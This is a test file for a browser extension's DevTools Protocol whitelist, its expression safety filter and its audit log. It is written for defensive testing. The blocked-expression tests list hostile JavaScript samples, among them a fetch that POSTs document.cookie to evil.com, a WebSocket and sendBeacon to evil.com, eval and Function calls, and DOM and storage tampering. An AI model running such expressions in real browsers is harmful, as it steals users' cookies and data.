/**
 * ClawMark — CDP Whitelist + Safety Filter Tests (#82)
 *
 * Tests the whitelist and safety modules in isolation.
 * These modules are designed as pure functions that can be tested
 * without chrome.* APIs.
 *
 * Run: node --test test/cdp-whitelist-safety.test.js
 */

'use strict';

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const vm = require('vm');

// ── Load extension scripts in a sandboxed context ────────────────────

function loadExtensionModules() {
    const ctx = {
        // Mock chrome API (minimal, for storage listener)
        chrome: {
            storage: {
                sync: { get: async (defaults) => defaults },
                onChanged: { addListener: () => {} },
            },
            tabs: {
                onUpdated: { addListener: () => {} },
                onRemoved: { addListener: () => {} },
            },
            debugger: {
                onDetach: { addListener: () => {} },
                onEvent: { addListener: () => {} },
            },
            action: {
                setBadgeText: async () => {},
                setBadgeBackgroundColor: async () => {},
            },
        },
        console,
        Date,
        Set,
        Map,
        Array,
        Object,
        RegExp,
        JSON,
        Promise,
        Error,
        setTimeout,
    };

    const sandbox = vm.createContext(ctx);

    // Load only the modules under test — whitelist, safety, relay.
    // cdp-session-manager and cdp-event-forwarder are not needed here
    // and including them risks unrelated test failures from their chrome.* deps.
    const files = [
        'cdp-whitelist.js',
        'cdp-safety.js',
        'cdp-relay.js',
    ];

    for (const file of files) {
        const code = fs.readFileSync(
            path.join(__dirname, '..', 'extension', 'background', file),
            'utf8',
        );
        vm.runInContext(code, sandbox, { filename: file });
    }

    return sandbox;
}

const mod = loadExtensionModules();

// ── Whitelist tests ──────────────────────────────────────────────────

describe('CDP Whitelist', () => {
    it('allows default read-only commands', () => {
        const allowed = [
            'DOM.getDocument',
            'DOM.querySelector',
            'DOM.querySelectorAll',
            'DOM.getOuterHTML',
            'CSS.getComputedStyleForNode',
            'Page.captureScreenshot',
            'Page.getFrameTree',
            'Network.enable',
            'Network.disable',
            'Runtime.evaluate',
            'Runtime.getProperties',
            'Console.enable',
            'Accessibility.getFullAXTree',
        ];

        for (const method of allowed) {
            const result = mod.cdpWhitelistCheck(method);
            assert.ok(result.allowed, `${method} should be allowed but got: ${result.reason}`);
        }
    });

    it('blocks always-blocked commands', () => {
        const blocked = [
            'Page.navigate',
            'Page.reload',
            'Debugger.enable',
            'Debugger.pause',
            'Target.createTarget',
            'Target.closeTarget',
            'Browser.close',
            'Security.setIgnoreCertificateErrors',
            'DOM.setNodeValue',
            'DOM.removeNode',
            'Input.dispatchKeyEvent',
            'Input.dispatchMouseEvent',
            'Fetch.enable',
            'Storage.clearDataForOrigin',
        ];

        for (const method of blocked) {
            const result = mod.cdpWhitelistCheck(method);
            assert.ok(!result.allowed, `${method} should be blocked`);
            assert.ok(result.reason.includes('always blocked') || result.reason.includes('blocked'),
                `${method} reason should mention blocked: ${result.reason}`);
        }
    });

    it('blocks unknown commands not in whitelist', () => {
        const unknown = [
            'Tracing.start',
            'HeapProfiler.takeSnapshot',
            'Profiler.enable',
            'SystemInfo.getInfo',
            'IO.read',
        ];

        for (const method of unknown) {
            const result = mod.cdpWhitelistCheck(method);
            assert.ok(!result.allowed, `${method} should be blocked (not in whitelist)`);
            assert.ok(result.reason.includes('not in whitelist'));
        }
    });

    it('rejects invalid method input', () => {
        assert.ok(!mod.cdpWhitelistCheck('').allowed);
        assert.ok(!mod.cdpWhitelistCheck(null).allowed);
        assert.ok(!mod.cdpWhitelistCheck(undefined).allowed);
    });

    it('returns whitelist info', () => {
        const info = mod.cdpWhitelistInfo();
        assert.ok(Array.isArray(info.defaultAllowed));
        assert.ok(Array.isArray(info.alwaysBlocked));
        assert.ok(info.defaultAllowed.includes('DOM.getDocument'));
        assert.ok(info.alwaysBlocked.includes('Page.navigate'));
    });
});

// ── Safety filter tests ──────────────────────────────────────────────

describe('CDP Safety Filter', () => {
    describe('Runtime.evaluate', () => {
        it('allows read-only expressions', () => {
            const safe = [
                'document.title',
                'document.querySelector("h1").textContent',
                'window.innerWidth',
                'JSON.stringify(performance.timing)',
                '1 + 1',
                'document.querySelectorAll("a").length',
                'getComputedStyle(document.body).backgroundColor',
            ];

            for (const expr of safe) {
                const result = mod.cdpSafetyCheck('Runtime.evaluate', { expression: expr });
                assert.ok(result.safe, `"${expr}" should be safe but got: ${result.reason}`);
            }
        });

        it('blocks DOM mutation', () => {
            const unsafe = [
                'document.body.innerHTML = "hacked"',
                'el.outerHTML = "<div>replaced</div>"',
                'el.setAttribute("class", "evil")',
                'el.removeAttribute("id")',
                'parent.appendChild(child)',
                'el.removeChild(child)',
                'el.remove()',
                'document.write("injected")',
                'document.createElement("script")',
            ];

            for (const expr of unsafe) {
                const result = mod.cdpSafetyCheck('Runtime.evaluate', { expression: expr });
                assert.ok(!result.safe, `"${expr}" should be blocked`);
            }
        });

        it('blocks navigation attempts', () => {
            const unsafe = [
                'window.location = "https://evil.com"',
                'location.href = "https://evil.com"',
                'window.open("https://evil.com")',
                'history.pushState({}, "", "/new-path")',
                'history.back()',
            ];

            for (const expr of unsafe) {
                const result = mod.cdpSafetyCheck('Runtime.evaluate', { expression: expr });
                assert.ok(!result.safe, `"${expr}" should be blocked`);
            }
        });

        it('blocks network requests', () => {
            const unsafe = [
                'fetch("https://evil.com/steal", { method: "POST", body: document.cookie })',
                'new XMLHttpRequest()',
                'new WebSocket("wss://evil.com")',
                'navigator.sendBeacon("https://evil.com", data)',
            ];

            for (const expr of unsafe) {
                const result = mod.cdpSafetyCheck('Runtime.evaluate', { expression: expr });
                assert.ok(!result.safe, `"${expr}" should be blocked`);
            }
        });

        it('blocks script injection', () => {
            const unsafe = [
                'eval("alert(1)")',
                'new Function("return document.cookie")()',
                'setTimeout(function(){ steal() }, 0)',
                'setInterval(pollData, 1000)',
            ];

            for (const expr of unsafe) {
                const result = mod.cdpSafetyCheck('Runtime.evaluate', { expression: expr });
                assert.ok(!result.safe, `"${expr}" should be blocked`);
            }
        });

        it('blocks storage mutation', () => {
            const unsafe = [
                'localStorage.setItem("key", "value")',
                'sessionStorage.removeItem("key")',
                'localStorage.clear()',
                'document.cookie = "stolen=true"',
            ];

            for (const expr of unsafe) {
                const result = mod.cdpSafetyCheck('Runtime.evaluate', { expression: expr });
                assert.ok(!result.safe, `"${expr}" should be blocked`);
            }
        });

        it('allows side effects when explicitly permitted', () => {
            const result = mod.cdpSafetyCheck(
                'Runtime.evaluate',
                { expression: 'document.body.innerHTML = "allowed"' },
                { allowSideEffects: true },
            );
            assert.ok(result.safe);
        });

        it('rejects missing expression', () => {
            const result = mod.cdpSafetyCheck('Runtime.evaluate', {});
            assert.ok(!result.safe);
        });
    });

    describe('Runtime.callFunctionOn', () => {
        it('allows read-only functions', () => {
            const result = mod.cdpSafetyCheck('Runtime.callFunctionOn', {
                functionDeclaration: 'function() { return this.textContent; }',
            });
            assert.ok(result.safe);
        });

        it('blocks functions with side effects', () => {
            const result = mod.cdpSafetyCheck('Runtime.callFunctionOn', {
                functionDeclaration: 'function() { this.innerHTML = "hacked"; }',
            });
            assert.ok(!result.safe);
        });
    });

    describe('Other commands', () => {
        it('considers other whitelisted commands safe', () => {
            const result = mod.cdpSafetyCheck('DOM.getDocument', {});
            assert.ok(result.safe);
        });
    });
});

// ── Audit log tests ──────────────────────────────────────────────────

describe('CDP Audit Log', () => {
    it('records entries', () => {
        mod.cdpClearAuditLog();

        mod.cdpAuditLog({
            tabId: 1,
            method: 'DOM.getDocument',
            params: {},
            allowed: true,
            success: true,
            durationMs: 5,
        });

        mod.cdpAuditLog({
            tabId: 1,
            method: 'Page.navigate',
            params: {},
            allowed: false,
            reason: 'Command always blocked',
        });

        const log = mod.cdpGetAuditLog();
        assert.equal(log.length, 2);
        assert.ok(log[0].timestamp > 0);
        assert.equal(log[0].method, 'DOM.getDocument');
        assert.equal(log[1].method, 'Page.navigate');
        assert.equal(log[1].allowed, false);
    });

    it('filters by tabId', () => {
        mod.cdpClearAuditLog();

        mod.cdpAuditLog({ tabId: 1, method: 'A', allowed: true });
        mod.cdpAuditLog({ tabId: 2, method: 'B', allowed: true });
        mod.cdpAuditLog({ tabId: 1, method: 'C', allowed: true });

        const log = mod.cdpGetAuditLog({ tabId: 1 });
        assert.equal(log.length, 2);
        assert.equal(log[0].method, 'A');
        assert.equal(log[1].method, 'C');
    });

    it('respects limit', () => {
        mod.cdpClearAuditLog();

        for (let i = 0; i < 10; i++) {
            mod.cdpAuditLog({ tabId: 1, method: `M${i}`, allowed: true });
        }

        const log = mod.cdpGetAuditLog({ limit: 3 });
        assert.equal(log.length, 3);
        // Should return the last 3
        assert.equal(log[0].method, 'M7');
    });

    it('clears log', () => {
        mod.cdpAuditLog({ tabId: 1, method: 'X', allowed: true });
        mod.cdpClearAuditLog();
        assert.equal(mod.cdpGetAuditLog().length, 0);
    });
});
